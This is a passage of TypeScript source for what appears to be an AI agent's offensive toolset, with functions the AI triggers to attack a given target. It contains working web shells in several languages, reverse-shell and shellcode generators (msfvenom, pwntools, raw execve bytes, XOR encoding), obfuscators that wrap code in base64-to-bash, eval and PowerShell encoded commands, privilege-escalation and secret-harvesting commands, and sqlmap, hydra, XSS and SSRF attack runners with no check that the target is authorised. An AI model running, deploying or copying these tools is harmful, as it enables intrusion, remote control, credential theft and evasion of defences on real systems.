        "php":   "<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>",
        "php2":  "<?php echo shell_exec($_GET['e'].' 2>&1'); ?>",
        "asp":   "<% Response.Write(CreateObject(\"WScript.Shell\").Exec(Request.QueryString(\"cmd\")).StdOut.ReadAll()) %>",
        "aspx":  "<%@ Page Language=\"C#\" %><% System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.FileName=\"cmd.exe\";p.StartInfo.Arguments=\"/c \"+Request[\"cmd\"];p.StartInfo.RedirectStandardOutput=true;p.StartInfo.UseShellExecute=false;p.Start();Response.Write(p.StandardOutput.ReadToEnd()); %>",
        "jsp":   "<% Runtime rt = Runtime.getRuntime(); String[] commands = {\"cmd.exe\",\"/c\",request.getParameter(\"cmd\")}; Process proc = rt.exec(commands); java.io.InputStream is = proc.getInputStream(); java.util.Scanner s = new java.util.Scanner(is).useDelimiter(\"\\\\A\"); String output = s.hasNext() ? s.next() : \"\"; out.println(output); %>",
        "python": "from flask import Flask,request;import subprocess;app=Flask(__name__);@app.route('/');def cmd():return subprocess.check_output(request.args.get('c','id'),shell=True);app.run(host='0.0.0.0',port=8080)",
    },
}

category = payload_type if payload_type in payloads else "reverse_shell"
lang = language if language in payloads.get(category, {}) else list(payloads.get(category, {}).keys())[0]
result = payloads.get(category, {}).get(lang, "Unsupported combination")
print(f"# {category} payload ({lang})")
print(result)
print()
print(f"# Available languages for {category}: {list(payloads.get(category, {}).keys())}")
PYEOF`,
      { timeoutMs: 30_000, triggeredBy: "ai" }
    );
    payloadOutput = manualResult.output;
  }

  const listenerCmd = payloadType === "bind_shell"
    ? `nc ${lhost} ${lport}`
    : `nc -lvnp ${lport}  # or: msfconsole -q -x "use exploit/multi/handler; set PAYLOAD ${msfPayload}; set LHOST ${lhost}; set LPORT ${lport}; run"`;

  return {
    success: true,
    data: {
      payloadType, platform, language, lhost, lport, encoding, staged, generationMethod,
      payload: payloadOutput,
      listenerCommand: listenerCmd,
      msfvenomCommand: `msfvenom -p ${msfPayload} LHOST=${lhost} LPORT=${lport} ${encoderFlag} -f ${format}`,
      message: `${payloadType} payload generated via ${generationMethod} for ${platform}/${language} → ${lhost}:${lport}`,
    },
  };
}

// ── SHELLCODE GENERATOR (#52) ──────────────────────────────────────────────
async function execShellcodeGen(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const arch = (args.arch as string) || "x64";
  const os = (args.os as string) || "linux";
  const shellcodeType = (args.shellcodeType as string) || "reverse_shell";
  const lhost = (args.lhost as string) || "10.10.14.1";
  const lport = (args.lport as number) || 4444;
  const encoder = (args.encoder as string) || "none";
  const outputFormat = (args.outputFormat as string) || "hex";

  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);

  // Install pwntools
  await executeCommand(sbId, userId,
    `python3 -c "import pwn" 2>/dev/null || pip3 install pwntools 2>&1 | tail -2`,
    { timeoutMs: 60_000, triggeredBy: "ai" }
  );

  // Try msfvenom first
  const msfPayloadMap: Record<string, Record<string, string>> = {
    linux: { x86: "linux/x86/shell_reverse_tcp", x64: "linux/x64/shell_reverse_tcp", arm: "linux/armle/shell_reverse_tcp" },
    windows: { x86: "windows/shell_reverse_tcp", x64: "windows/x64/shell_reverse_tcp" },
  };
  const msfPayload = msfPayloadMap[os]?.[arch] || "linux/x64/shell_reverse_tcp";
  const encoderFlag = encoder !== "none" ? `-e ${encoder}` : "";

  const msfResult = await executeCommand(sbId, userId,
    `msfvenom -p ${msfPayload} LHOST=${lhost} LPORT=${lport} ${encoderFlag} -f ${outputFormat} 2>&1 | head -50 || echo "MSFVENOM_UNAVAILABLE"`,
    { timeoutMs: 60_000, triggeredBy: "ai" }
  );

  let shellcodeOutput = msfResult.output;
  let method = "msfvenom";

  if (msfResult.output.includes("MSFVENOM_UNAVAILABLE") || msfResult.output.includes("command not found")) {
    method = "pwntools";
    const pwntoolsResult = await executeCommand(sbId, userId,
      `python3 << 'PYEOF'
try:
    from pwn import *
    context.arch = "${arch}"
    context.os = "${os}"
    if "${shellcodeType}" == "shell":
        sc = asm(shellcraft.sh())
    elif "${shellcodeType}" == "reverse_shell":
        sc = asm(shellcraft.connect("${lhost}", ${lport}) + shellcraft.dupsh())
    else:
        sc = asm(shellcraft.sh())
    
    fmt = "${outputFormat}"
    if fmt == "hex":
        print(sc.hex())
    elif fmt == "c":
        print("unsigned char shellcode[] = {" + ",".join(hex(b) for b in sc) + "};")
        print(f"unsigned int shellcode_len = {len(sc)};")
    elif fmt == "python":
        print("shellcode = b'" + "".join(f"\\\\x{b:02x}" for b in sc) + "'")
    elif fmt == "base64":
        import base64
        print(base64.b64encode(sc).decode())
    else:
        print(sc.hex())
    print(f"# Length: {len(sc)} bytes, arch: ${arch}/${os}")
except Exception as e:
    print(f"pwntools error: {e}")
    # Fallback: classic x64 Linux execve /bin/sh shellcode
    sc = bytes([0x48,0x31,0xd2,0x48,0xbb,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x48,0xc1,0xeb,0x08,0x53,0x48,0x89,0xe7,0x52,0x57,0x48,0x89,0xe6,0xb0,0x3b,0x0f,0x05])
    print("# Fallback: x64 Linux execve /bin/sh (30 bytes)")
    print("\\\\x" + "\\\\x".join(f"{b:02x}" for b in sc))
PYEOF`,
      { timeoutMs: 30_000, triggeredBy: "ai" }
    );
    shellcodeOutput = pwntoolsResult.output;
  }

  // Apply XOR encoding if requested
  if (encoder === "xor" && !msfResult.output.includes("MSFVENOM_UNAVAILABLE")) {
    const xorResult = await executeCommand(sbId, userId,
      `python3 -c "
raw_hex = '${shellcodeOutput.replace(/[^0-9a-fA-F]/g, '').substring(0, 2000)}'
if raw_hex:
    raw = bytes.fromhex(raw_hex)
    key = 0xAA
    encoded = bytes(b ^ key for b in raw)
    print(f'XOR key: 0x{key:02x}')
    print(f'Encoded ({len(encoded)} bytes): ' + encoded.hex())
    print('Decoder stub:')
    print(f'  key = 0x{key:02x}')
    print(f'  shellcode = bytes(b ^ key for b in bytes.fromhex(\"{encoded.hex()}\"))')
else:
    print('Could not apply XOR: no hex shellcode found')
" 2>&1`,
      { timeoutMs: 10_000, triggeredBy: "ai" }
    );
    shellcodeOutput += "\n\n" + xorResult.output;
  }

  return {
    success: true,
    data: {
      arch, os, shellcodeType, lhost, lport, encoder, outputFormat, method,
      shellcode: shellcodeOutput,
      message: `${arch}/${os} shellcode generated via ${method} (${outputFormat}${encoder !== "none" ? ", " + encoder + " encoded" : ""})`,
    },
  };
}

// ── CODE OBFUSCATOR (#53) ──────────────────────────────────────────────────
async function execCodeObfuscate(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const code = args.code as string;
  const language = (args.language as string) || "python";
  const level = (args.level as string) || "medium";

  if (!code) return { success: false, error: "Code is required" };

  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);

  // Write code to temp file
  const escapedCode = code.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
  await executeCommand(sbId, userId,
    `printf '%s' '${escapedCode}' > /tmp/obf_input_src`,
    { timeoutMs: 5_000, triggeredBy: "ai" }
  );

  let obfuscatedCode = "";
  let method = "";

  if (language === "python") {
    method = "base64+zlib (PyArmor fallback)";
    await executeCommand(sbId, userId,
      `pip3 install pyarmor 2>&1 | tail -1`,
      { timeoutMs: 60_000, triggeredBy: "ai" }
    );
    const pyarmorResult = await executeCommand(sbId, userId,
      `cp /tmp/obf_input_src /tmp/obf_input.py && cd /tmp && pyarmor gen obf_input.py 2>&1 && cat /tmp/dist/obf_input.py 2>/dev/null || echo "PYARMOR_FAILED"`,
      { timeoutMs: 30_000, triggeredBy: "ai" }
    );
    if (!pyarmorResult.output.includes("PYARMOR_FAILED")) {
      obfuscatedCode = pyarmorResult.output;
      method = "PyArmor";
    } else {
      const manualResult = await executeCommand(sbId, userId,
        `python3 -c "
import base64, zlib
code = open('/tmp/obf_input_src').read()
compressed = zlib.compress(code.encode())
encoded = base64.b64encode(compressed).decode()
print('import base64,zlib')
print(f'exec(zlib.decompress(base64.b64decode(\"{encoded}\")))')
" 2>&1`,
        { timeoutMs: 10_000, triggeredBy: "ai" }
      );
      obfuscatedCode = manualResult.output;
    }
  } else if (language === "powershell") {
    method = "Base64 + char array";
    const psResult = await executeCommand(sbId, userId,
      `python3 -c "
import base64
code = open('/tmp/obf_input_src').read()
encoded = base64.b64encode(code.encode('utf-16-le')).decode()
print(f'powershell -EncodedCommand {encoded}')
print()
print('# Char array variant:')
chars = ','.join(str(ord(c)) for c in code[:500])
print(f'IEX([char[]]({chars}) -join \\'\\'')")
" 2>&1`,
      { timeoutMs: 10_000, triggeredBy: "ai" }
    );
    obfuscatedCode = psResult.output;
  } else if (language === "javascript" || language === "js") {
    method = "atob/eval + hex encoding";
    const jsResult = await executeCommand(sbId, userId,
      `python3 -c "
import base64
code = open('/tmp/obf_input_src').read()
encoded = base64.b64encode(code.encode()).decode()
print(f'eval(atob(\"{encoded}\"))')
print()
print('// Hex variant:')
hex_str = ''.join(f'\\\\x{ord(c):02x}' for c in code[:300])
print(f'eval(\"{hex_str}...\")')
" 2>&1`,
      { timeoutMs: 10_000, triggeredBy: "ai" }
    );
    obfuscatedCode = jsResult.output;
  } else if (language === "bash") {
    method = "base64 pipe";
    const bashResult = await executeCommand(sbId, userId,
      `python3 -c "
import base64
code = open('/tmp/obf_input_src').read()
encoded = base64.b64encode(code.encode()).decode()
print(f'echo {encoded}|base64 -d|bash')
print()
print('# Hex variant:')
hex_str = ''.join(f'\\\\x{ord(c):02x}' for c in code[:200])
print(f'echo -e \"{hex_str}\"|bash')
" 2>&1`,
      { timeoutMs: 10_000, triggeredBy: "ai" }
    );
    obfuscatedCode = bashResult.output;
  } else {
    obfuscatedCode = `Language '${language}' not supported. Supported: python, powershell, javascript, bash`;
  }

  return {
    success: true,
    data: {
      language, level, method,
      originalLength: code.length,
      obfuscatedCode,
      message: `Code obfuscated (${language}, ${method})`,
    },
  };
}

// ── PRIVILEGE ESCALATION CHECKER (#54) ────────────────────────────────────
async function execPrivescCheck(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const targetOs = (args.targetOs as string) || "linux";
  const depth = (args.depth as string) || "standard";

  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);

  let findings = "";
  let method = "";

  if (targetOs === "linux") {
    method = "LinPEAS + manual checks";
    // Try LinPEAS, fall back to manual
    const linpeasResult = await executeCommand(sbId, userId,
      `curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh 2>/dev/null && chmod +x /tmp/linpeas.sh && timeout 60 bash /tmp/linpeas.sh -q 2>&1 | head -300 || echo "LINPEAS_UNAVAILABLE"`,
      { timeoutMs: 90_000, triggeredBy: "ai" }
    );

    if (linpeasResult.output.includes("LINPEAS_UNAVAILABLE") || linpeasResult.output.length < 200) {
      method = "manual checks";
      const manualResult = await executeCommand(sbId, userId,
        `echo "=== SUID BINARIES ===" && find / -perm -4000 -type f 2>/dev/null | head -20 && echo "=== SUDO ===" && sudo -l 2>&1 && echo "=== CAPABILITIES ===" && getcap -r / 2>/dev/null && echo "=== WRITABLE CRON ===" && ls -la /etc/cron* 2>/dev/null && echo "=== KERNEL ===" && uname -a && echo "=== DOCKER GROUP ===" && id && echo "=== ENV SECRETS ===" && env | grep -iE "pass|key|secret|token" 2>/dev/null | head -10`,
        { timeoutMs: 60_000, triggeredBy: "ai" }
      );
      findings = manualResult.output;
    } else {
      findings = linpeasResult.output.substring(0, 5000);
    }
  } else {
    method = "WinPEAS checklist";
    findings = `Windows Privilege Escalation Checklist:

1. AlwaysInstallElevated:
   reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
   reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

2. Token privileges (look for SeImpersonatePrivilege → Potato attacks):
   whoami /priv

3. Unquoted service paths:
   wmic service get name,pathname | findstr /i /v "C:\\Windows\\\\"

4. Stored credentials:
   cmdkey /list

5. UAC bypass check:
   reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA

6. Scheduled tasks with weak permissions:
   schtasks /query /fo LIST /v | findstr /i "task name\\|run as\\|status"

Download WinPEAS: https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe
Run: winPEASany.exe quiet`;
  }

  return {
    success: true,
    data: {
      targetOs, depth, method, findings,
      message: `Privilege escalation check complete for ${targetOs} (${method})`,
    },
  };
}


async function execOsintLookup(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const target = args.target as string;
  if (!target) return { success: false, error: "Target is required" };
  const depth = (args.depth as string) || "standard";
  
  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);
  
  const results: Record<string, string> = {};
  
  // WHOIS
  const whoisResult = await executeCommand(sbId, userId, `whois ${target} 2>&1 | head -40`, { timeoutMs: 15_000, triggeredBy: "ai" });
  results.whois = whoisResult.output;
  
  // DNS records
  const dnsResult = await executeCommand(sbId, userId, `dig +short A ${target} && dig +short MX ${target} && dig +short NS ${target} && dig +short TXT ${target} 2>&1`, { timeoutMs: 15_000, triggeredBy: "ai" });
  results.dns = dnsResult.output;
  
  // Reverse DNS
  const rdnsResult = await executeCommand(sbId, userId, `host ${target} 2>&1`, { timeoutMs: 10_000, triggeredBy: "ai" });
  results.reverseDns = rdnsResult.output;
  
  // Certificate transparency (crt.sh)
  const certResult = await executeCommand(sbId, userId, 
    `curl -s "https://crt.sh/?q=${target}&output=json" 2>/dev/null | python3 -c "import sys,json; data=json.load(sys.stdin); [print(d['name_value']) for d in data[:20]]" 2>&1 || echo "cert lookup failed"`,
    { timeoutMs: 20_000, triggeredBy: "ai" }
  );
  results.certificates = certResult.output;
  
  if (depth === "deep") {
    // Shodan (if API key available)
    const shodanResult = await executeCommand(sbId, userId,
      `curl -s "https://api.shodan.io/shodan/host/${target}?key=\${SHODAN_API_KEY:-}" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(json.dumps({k:d[k] for k in ['ip_str','ports','hostnames','org','country_name'] if k in d}, indent=2))" 2>&1 || echo "Shodan: no API key"`,
      { timeoutMs: 15_000, triggeredBy: "ai" }
    );
    results.shodan = shodanResult.output;
  }
  
  return {
    success: true,
    data: {
      target,
      depth,
      results,
      message: `OSINT report for ${target} complete`,
    },
  };
}

async function execCveLookup(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const query = args.query as string;
  if (!query) return { success: false, error: "Query is required" };
  const includeExploits = args.includeExploits !== false;
  
  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);
  
  // Query NVD API
  const isCveId = /^CVE-\d{4}-\d+$/i.test(query.trim());
  let nvdUrl: string;
  if (isCveId) {
    nvdUrl = `https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=${query.trim().toUpperCase()}`;
  } else {
    const encoded = encodeURIComponent(query);
    nvdUrl = `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encoded}&resultsPerPage=5`;
  }
  
  const nvdResult = await executeCommand(sbId, userId,
    `curl -s "${nvdUrl}" 2>/dev/null | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    vulns = d.get('vulnerabilities', [])[:5]
    for v in vulns:
        cve = v['cve']
        cid = cve['id']
        desc = cve.get('descriptions', [{}])[0].get('value', 'N/A')[:300]
        metrics = cve.get('metrics', {})
        cvss = 'N/A'
        for k in ['cvssMetricV31', 'cvssMetricV30', 'cvssMetricV2']:
            if k in metrics:
                cvss = metrics[k][0]['cvssData'].get('baseScore', 'N/A')
                break
        print(f'{cid} | CVSS: {cvss} | {desc}')
        print('---')
except Exception as e:
    print(f'Parse error: {e}')
" 2>&1`,
    { timeoutMs: 20_000, triggeredBy: "ai" }
  );
  
  let exploitData = "";
  if (includeExploits) {
    const exploitResult = await executeCommand(sbId, userId,
      `curl -s "https://www.exploit-db.com/search?q=${encodeURIComponent(query)}&type=exploits&platform=&language=&author=&port=&tag=&e_author=" 2>/dev/null | python3 -c "
import sys, re
html = sys.stdin.read()
matches = re.findall(r'href=\"(/exploits/\d+)\"[^>]*>([^<]+)<', html)
for m in matches[:5]:
    print(f'https://www.exploit-db.com{m[0]} | {m[1].strip()}')
" 2>&1 || echo "Exploit-DB search unavailable"`,
      { timeoutMs: 15_000, triggeredBy: "ai" }
    );
    exploitData = exploitResult.output;
  }
  

  // Query GitHub Security Advisories (#36)
  const ghAdvisoryResult = await executeCommand(sbId, userId,
    `curl -s -H "Accept: application/vnd.github+json" "https://api.github.com/advisories?q=${encodeURIComponent(query)}&per_page=5" 2>/dev/null | python3 -c "
import sys, json
try:
    advisories = json.load(sys.stdin)
    if isinstance(advisories, list):
        for a in advisories[:5]:
            ghsa = a.get('ghsa_id', 'N/A')
            severity = a.get('severity', 'N/A')
            summary = a.get('summary', 'N/A')[:200]
            cves = ', '.join(a.get('cve_id', []) or [])
            print(f'{ghsa} | Severity: {severity} | CVEs: {cves or "none"} | {summary}')
            print('---')
    else:
        print('No advisories found')
except Exception as e:
    print(f'Parse error: {e}')
" 2>&1 || echo "GitHub Advisory API unavailable"`,
    { timeoutMs: 15_000, triggeredBy: "ai" }
  );

  return {
    success: true,
    data: {
      query,
      nvdResults: nvdResult.output,
      exploitDbResults: exploitData,
      githubAdvisories: ghAdvisoryResult.output,
      message: `CVE lookup complete for: ${query} (NVD + ExploitDB + GitHub Advisories)`,
    },
  };
}

async function execRunExploit(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const tool = args.tool as string;
  const target = args.target as string;
  if (!tool || !target) return { success: false, error: "Tool and target are required" };
  const options = (args.options as string) || "";
  const scriptPath = (args.scriptPath as string) || "";
  
  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);
  
  let cmd: string;
  switch (tool.toLowerCase()) {
    case "sqlmap":
      cmd = `sqlmap -u "${target}" ${options} --batch --level=2 --risk=2 2>&1`;
      await executeCommand(sbId, userId, "which sqlmap || pip3 install sqlmap -q 2>/dev/null", { timeoutMs: 60_000, triggeredBy: "ai" });
      break;
    case "nikto":
      cmd = `nikto -h "${target}" ${options} 2>&1`;
      await executeCommand(sbId, userId, "which nikto || apt-get install -y nikto -qq 2>/dev/null", { timeoutMs: 60_000, triggeredBy: "ai" });
      break;
    case "hydra":
      cmd = `hydra ${options} "${target}" 2>&1`;
      await executeCommand(sbId, userId, "which hydra || apt-get install -y hydra -qq 2>/dev/null", { timeoutMs: 60_000, triggeredBy: "ai" });
      break;
    case "gobuster":
      cmd = `gobuster dir -u "${target}" ${options || "-w /usr/share/wordlists/dirb/common.txt"} 2>&1`;
      await executeCommand(sbId, userId, "which gobuster || apt-get install -y gobuster -qq 2>/dev/null", { timeoutMs: 60_000, triggeredBy: "ai" });
      break;
    case "ffuf":
      cmd = `ffuf -u "${target}" ${options || "-w /usr/share/wordlists/dirb/common.txt"} 2>&1`;
      await executeCommand(sbId, userId, "which ffuf || apt-get install -y ffuf -qq 2>/dev/null", { timeoutMs: 60_000, triggeredBy: "ai" });
      break;
    case "custom":
      if (!scriptPath) return { success: false, error: "scriptPath required for custom tool" };
      cmd = `python3 "${scriptPath}" 2>&1`;
      break;
    default:
      cmd = `${tool} ${options} "${target}" 2>&1`;
  }
  
  const result = await executeCommand(sbId, userId, cmd, { timeoutMs: 300_000, triggeredBy: "ai" });
  
  return {
    success: true,
    data: {
      tool,
      target,
      output: result.output,
      exitCode: result.exitCode,
      durationMs: result.durationMs,
    },
  };
}

async function execDecompileBinary(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const filePath = args.filePath as string;
  if (!filePath) return { success: false, error: "File path is required" };
  const tool = (args.tool as string) || "radare2";
  const analysis = (args.analysis as string) || "full";
  
  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);
  
  // Install radare2 if needed
  if (tool === "radare2" || tool === "r2") {
    await executeCommand(sbId, userId, "which r2 || apt-get install -y radare2 -qq 2>/dev/null", { timeoutMs: 60_000, triggeredBy: "ai" });
  }
  
  let cmd: string;
  switch (analysis) {
    case "strings":
      cmd = `strings "${filePath}" 2>&1 | head -100`;
      break;
    case "imports":
      cmd = `r2 -q -c "ia" "${filePath}" 2>&1`;
      break;
    case "functions":
      cmd = `r2 -q -c "aa; afl" "${filePath}" 2>&1`;
      break;
    case "main":
      cmd = `r2 -q -c "aa; s main; pdf" "${filePath}" 2>&1`;
      break;
    default: // full
      cmd = `r2 -q -c "aa; afl; s main; pdf; iz" "${filePath}" 2>&1 | head -200`;
  }
  
  const result = await executeCommand(sbId, userId, cmd, { timeoutMs: 120_000, triggeredBy: "ai" });
  
  // Also get file info
  const fileInfo = await executeCommand(sbId, userId, `file "${filePath}" && checksec --file="${filePath}" 2>/dev/null || echo "checksec not available"`, { timeoutMs: 10_000, triggeredBy: "ai" });
  
  return {
    success: true,
    data: {
      filePath,
      tool,
      analysis,
      fileInfo: fileInfo.output,
      output: result.output,
    },
  };
}

async function execFuzzerRun(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const target = args.target as string;
  if (!target) return { success: false, error: "Target is required" };
  const fuzzerType = (args.fuzzerType as string) || "web";
  const wordlist = (args.wordlist as string) || "common";
  const options = (args.options as string) || "";
  
  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);
  
  const wordlistPaths: Record<string, string> = {
    common: "/usr/share/wordlists/dirb/common.txt",
    big: "/usr/share/wordlists/dirb/big.txt",
    directories: "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
    api: "/usr/share/wordlists/dirb/common.txt",
  };
  const wlPath = wordlistPaths[wordlist] || wordlist;
  
  let cmd: string;
  if (fuzzerType === "web") {
    // Install ffuf if needed
    await executeCommand(sbId, userId, "which ffuf || apt-get install -y ffuf -qq 2>/dev/null || go install github.com/ffuf/ffuf/v2@latest 2>/dev/null", { timeoutMs: 60_000, triggeredBy: "ai" });
    // Ensure wordlist exists
    await executeCommand(sbId, userId, `[ -f "${wlPath}" ] || apt-get install -y wordlists dirb -qq 2>/dev/null`, { timeoutMs: 30_000, triggeredBy: "ai" });
    cmd = `ffuf -u "${target}" -w "${wlPath}" ${options} -mc 200,201,204,301,302,307,401,403 -t 50 2>&1 | head -100`;
  } else if (fuzzerType === "binary") {
    await executeCommand(sbId, userId, "which afl-fuzz || apt-get install -y afl++ -qq 2>/dev/null", { timeoutMs: 60_000, triggeredBy: "ai" });
    cmd = `echo "AFL++ fuzzing setup for ${target}. Run: afl-fuzz -i /tmp/afl_in -o /tmp/afl_out -- ${target} @@" 2>&1`;
  } else {
    cmd = `ffuf -u "${target}" -w "${wlPath}" ${options} -t 30 2>&1 | head -100`;
  }
  
  const result = await executeCommand(sbId, userId, cmd, { timeoutMs: 180_000, triggeredBy: "ai" });
  
  return {
    success: true,
    data: {
      target,
      fuzzerType,
      wordlist: wlPath,
      output: result.output,
      durationMs: result.durationMs,
    },
  };
}

// ── WEB ATTACK TOOL (#55) ─────────────────────────────────────────────────
async function execWebAttack(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const target = args.target as string;
  const attackType = (args.attackType as string) || "scan";
  const options = (args.options as string) || "";

  if (!target) return { success: false, error: "Target URL is required" };

  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);

  // Install tools
  await executeCommand(sbId, userId,
    `which nikto 2>/dev/null || apt-get install -y nikto -qq 2>/dev/null; which sqlmap 2>/dev/null || pip3 install sqlmap 2>/dev/null; which xsstrike 2>/dev/null || pip3 install xsstrike 2>/dev/null; echo "tools_ready"`,
    { timeoutMs: 120_000, triggeredBy: "ai" }
  );

  let cmd = "";
  let toolUsed = "";

  if (attackType === "nikto" || attackType === "scan") {
    toolUsed = "nikto";
    cmd = `nikto -h "${target}" ${options} -maxtime 60 2>&1 | head -100 || echo "nikto not available, running basic curl check" && curl -sI "${target}" 2>&1 | head -30`;
  } else if (attackType === "sqli" || attackType === "sqlmap") {
    toolUsed = "sqlmap";
    cmd = `sqlmap -u "${target}" --batch --level=2 --risk=1 ${options} 2>&1 | head -100`;
  } else if (attackType === "xss") {
    toolUsed = "XSStrike";
    cmd = `python3 -m xsstrike -u "${target}" ${options} 2>&1 | head -80 || python3 -c "
import requests, urllib.parse
target = '${target}'
payloads = [
    '<script>alert(1)</script>',
    '\\\"><script>alert(1)</script>',
    \"'><img src=x onerror=alert(1)>\",
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
    '\\\"onmouseover=\\\"alert(1)',
]
print(f'Testing XSS on: {target}')
for p in payloads:
    try:
        r = requests.get(target, params={'q': p, 'search': p, 'id': p}, timeout=5, verify=False)
        if p in r.text:
            print(f'POTENTIAL XSS: {p}')
        else:
            print(f'Not reflected: {p[:30]}...')
    except Exception as e:
        print(f'Error: {e}')
" 2>&1`;
  } else if (attackType === "ssrf") {
    toolUsed = "SSRF scanner";
    cmd = `python3 -c "
import requests, urllib.parse
target = '${target}'
ssrf_payloads = [
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/metadata/v1/',
    'http://metadata.google.internal/',
    'http://localhost:80/',
    'http://127.0.0.1:22/',
    'http://0.0.0.0:6379/',
    'file:///etc/passwd',
    'dict://localhost:6379/info',
]
params_to_test = ['url', 'redirect', 'next', 'path', 'dest', 'uri', 'target', 'src', 'source', 'fetch', 'load']
print(f'Testing SSRF on: {target}')
for param in params_to_test:
    for payload in ssrf_payloads[:3]:
        try:
            r = requests.get(target, params={param: payload}, timeout=5, verify=False, allow_redirects=False)
            if r.status_code in [200, 301, 302] and len(r.text) > 100:
                print(f'POTENTIAL SSRF: param={param}, payload={payload}, status={r.status_code}, len={len(r.text)}')
        except: pass
print('SSRF scan complete')
" 2>&1`;
  } else if (attackType === "headers") {
    toolUsed = "security headers check";
    cmd = `python3 -c "
import requests
r = requests.get('${target}', timeout=10, verify=False)
headers = r.headers
security_headers = {
    'Strict-Transport-Security': 'HSTS',
    'Content-Security-Policy': 'CSP',
    'X-Frame-Options': 'Clickjacking protection',
    'X-Content-Type-Options': 'MIME sniffing protection',
    'X-XSS-Protection': 'XSS filter',
    'Referrer-Policy': 'Referrer policy',
    'Permissions-Policy': 'Permissions policy',
}
print(f'Security Headers Analysis: ${target}')
print(f'Status: {r.status_code}')
print()
for header, desc in security_headers.items():
    val = headers.get(header, 'MISSING')
    status = 'PRESENT' if val != 'MISSING' else 'MISSING'
    print(f'  {status}: {header} ({desc}) = {val[:80]}')
print()
print('Server:', headers.get('Server', 'hidden'))
print('X-Powered-By:', headers.get('X-Powered-By', 'hidden'))
" 2>&1`;
  } else {
    cmd = `echo "Unknown attack type: ${attackType}. Supported: scan, nikto, sqli, xss, ssrf, headers"`;
    toolUsed = "none";
  }

  const result = await executeCommand(sbId, userId, cmd, { timeoutMs: 120_000, triggeredBy: "ai" });

  return {
    success: true,
    data: {
      target, attackType, toolUsed,
      output: result.output,
      message: `Web attack (${attackType}) complete against ${target} using ${toolUsed}`,
    },
  };
}

// ── THREAT INTEL LOOKUP (#56) ─────────────────────────────────────────────
async function execThreatIntelLookup(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const ioc = args.ioc as string;
  const iocType = (args.iocType as string) || "auto";

  if (!ioc) return { success: false, error: "IOC (IP, domain, hash, or URL) is required" };

  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);

  // Auto-detect IOC type
  const detectCmd = `python3 -c "
import re
ioc = '${ioc.replace(/'/g, "\\'")}'
if re.match(r'^[0-9a-fA-F]{32}$', ioc): print('md5')
elif re.match(r'^[0-9a-fA-F]{40}$', ioc): print('sha1')
elif re.match(r'^[0-9a-fA-F]{64}$', ioc): print('sha256')
elif re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ioc): print('ip')
elif ioc.startswith('http'): print('url')
else: print('domain')
" 2>&1`;
  const detectResult = await executeCommand(sbId, userId, detectCmd, { timeoutMs: 5_000, triggeredBy: "ai" });
  const detectedType = iocType === "auto" ? detectResult.output.trim() : iocType;

  const results: Record<string, string> = {};

  // VirusTotal (free API - no key needed for basic lookups via web)
  const vtResult = await executeCommand(sbId, userId,
    `python3 -c "
import urllib.request, json, os
ioc = '${ioc.replace(/'/g, "\\'")}'
ioc_type = '${detectedType}'
vt_key = os.environ.get('VIRUSTOTAL_API_KEY', '')

if vt_key:
    endpoints = {
        'ip': f'https://www.virustotal.com/api/v3/ip_addresses/{ioc}',
        'domain': f'https://www.virustotal.com/api/v3/domains/{ioc}',
        'md5': f'https://www.virustotal.com/api/v3/files/{ioc}',
        'sha1': f'https://www.virustotal.com/api/v3/files/{ioc}',
        'sha256': f'https://www.virustotal.com/api/v3/files/{ioc}',
        'url': f'https://www.virustotal.com/api/v3/urls/{ioc}',
    }
    url = endpoints.get(ioc_type, endpoints['domain'])
    req = urllib.request.Request(url, headers={'x-apikey': vt_key})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            data = json.loads(r.read())
            stats = data.get('data', {}).get('attributes', {}).get('last_analysis_stats', {})
            malicious = stats.get('malicious', 0)
            total = sum(stats.values())
            print(f'VirusTotal: {malicious}/{total} engines flagged as malicious')
            print(f'Verdict: {\"MALICIOUS\" if malicious > 3 else \"CLEAN\"}')
    except Exception as e:
        print(f'VirusTotal error: {e}')
else:
